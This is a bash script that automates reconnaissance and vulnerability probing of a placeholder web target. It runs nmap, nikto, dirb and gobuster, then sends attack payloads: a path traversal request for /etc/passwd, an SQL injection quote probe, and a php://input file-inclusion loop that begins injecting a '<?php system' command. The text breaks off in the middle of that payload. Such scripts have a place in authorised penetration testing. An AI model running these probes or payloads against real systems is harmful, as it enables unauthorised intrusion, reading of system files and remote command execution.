#!/bin/bash

# Define variables for the script
target="example.com"
output_directory="output"
nmap_options="-sS -T4"
nikto_options="-h $target -port 80,443 -Format htm"
gobuster_options="-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -e -k -o $output_directory/gobuster_scan.txt -u https://$target/"
dirb_options="-r -z 20 -o $output_directory/dirb_scan.txt -w /usr/share/dirb/wordlists/common.txt -t 30 -S -X .php,.html,.txt,.js -R 2 https://$target/"
output_html="$output_directory/report.html"

# Create the output directory if it doesn't exist
mkdir -p "$output_directory"

# Perform an nmap scan on the target and output to a file
echo "Running nmap scan on $target..."
nmap $nmap_options -oN "$output_directory/nmap_scan.txt" "$target"

# Check if any open ports were found
if grep -q "open" "$output_directory/nmap_scan.txt"; then
  echo "Open ports found. Starting vulnerability scan..."
  # Perform vulnerability scans using tools such as nikto, dirb, and Gobuster and output to files

  # Example using nikto
  echo "Running nikto scan on $target..."
  nikto $nikto_options -output "$output_directory/nikto_scan.htm"

  # Example using dirb
  echo "Running dirb scan on $target..."
  dirb $dirb_options

  # Example using Gobuster
  echo "Running Gobuster scan on $target..."
  gobuster dir $gobuster_options
else
  echo "No open ports found. Skipping vulnerability scan."
fi

# Check if the target is vulnerable to path traversal attacks
echo "Checking for path traversal vulnerabilities on $target..."
if curl -s "$target/index.php?page=../../../../etc/passwd" | grep -q "root:"; then
  echo "Path traversal vulnerability found!"
else
  echo "No path traversal vulnerability found."
fi

# Check if the target is vulnerable to SQL injection attacks
echo "Checking for SQL injection vulnerabilities on $target..."
if curl -s "$target/index.php?id=1'" | grep -q "You have an error in your SQL syntax"; then
  echo "SQL injection vulnerability found!"
else
  echo "No SQL injection vulnerability found."
fi

# Check if the target has any APIs exposed
echo "Checking for exposed APIs on $target..."
if curl -s "$target/api" | grep -q "API documentation"; then
  echo "API found!"
else
  echo "No APIs found."
fi

# Identify all parameters in the target URL and output to a file
echo "Identifying parameters on $target..."
grep -oP "(?<=\?|&)[^&=]+" "$output_directory/nikto_scan.htm" | sort -u > "$output_directory/parameters.txt"
echo "Parameters saved to $output_directory/parameters.txt"

# Scan for file inclusions using LFI/RFI attack
echo "Scanning for file inclusions on $target..."
while read -r parameter; do
  curl -s "$target/index.php?page=php://input" --data "<?php system
